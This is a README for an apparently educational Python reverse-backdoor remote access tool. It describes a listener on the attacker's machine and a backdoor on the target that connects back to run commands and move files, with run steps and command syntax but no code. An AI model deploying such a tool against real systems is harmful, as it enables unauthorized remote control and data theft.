README
Reverse backdoor - Listener and Backdoor
This project consists of two Python scripts, a "listener" and a "backdoor," which together form a simple Remote Access Tool. The purpose of this tool is for educational and learning purposes only, to understand the basic concepts of networking and remote command execution. It is crucial to use this tool responsibly and not engage in any illegal or unauthorized activities.

Note: The usage of this tool on any system or network without explicit authorization is strictly prohibited and illegal.

Features
Listener:

The listener script is intended to run on the attacker's machine.
It waits for incoming connections from the backdoor on a specified IP address and port.
It provides a command-line interface for the attacker to interact with the connected backdoor remotely.
The attacker can execute system commands, change the working directory, upload files to the backdoor, and download files from the backdoor.

Backdoor:
The backdoor script is intended to run on the target machine.
It connects back to the listener on a specified IP address and port.
It listens for commands from the listener and executes them on the target machine.
It can execute system commands, change the working directory, read files, and write/upload files to the target machine.

Usage
Important: Ensure you have proper authorization before running this tool on any system or network. Unauthorized access to systems is illegal and unethical.

Start the Listener:
Modify the IP address and port in the my_listener = Listener("XXX.XXX.XXX.XXX", 4444) line of the listener.py script to your desired IP and port.
Run the listener script on your machine using Python:
$ python listener.py

The listener will wait for incoming connections from the backdoor.

Run the Backdoor on the Target:
Modify the IP address and port in the my_backdoor = Backdoor("XXX.XXX.XXX.XXX", 4444) line of the backdoor.py script to match the IP and port of the listener.
Execute the backdoor script on the target system using Python or by running the generated executable (if compiled to an executable).

$ python backdoor.py
The backdoor will attempt to connect to the listener.

Interact with the Backdoor:
Once the backdoor successfully connects to the listener, you can use the listener's command-line interface to interact with the backdoor remotely.
The backdoor will execute commands sent from the listener and send back the results.

The following commands are supported:

>> command_to_execute
Change Working Directory
>> cd path_to_directory
Upload File to Target
>> upload local_file_path_on_listener
Download File from Target
>> download path_to_remote_file_on_target

Disclaimer
This reverse backdoor is for educational purposes only. Unauthorized access to systems, networks, or data is illegal and unethical. The authors of this tool are not responsible for any misuse or damages caused by the use of this tool. Use it responsibly and only on systems where you have explicit authorization.

License
This project is open-source and licensed under the MIT License. Feel free to use, modify, and distribute it as per the terms of the MIT License.

Happy hacking and stay curious!



